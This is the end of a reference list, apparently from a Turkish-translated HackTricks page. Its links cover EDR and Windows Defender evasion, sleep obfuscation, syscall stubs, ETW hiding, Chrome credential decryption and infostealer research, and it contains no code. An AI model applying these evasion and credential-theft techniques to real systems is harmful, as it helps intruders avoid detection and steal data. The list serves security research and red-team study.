- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lara karşı koymak](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique ile Windows Defender'ın protective shell'ini kırmak](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain'ın altında: RAT'ten builder'a, builder'dan coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware'ini yenmek](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Adaptix'i Crystal Palace ile uykuya yatırmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW'nizi gizlemek](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop'ı kötüye kullanmak: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
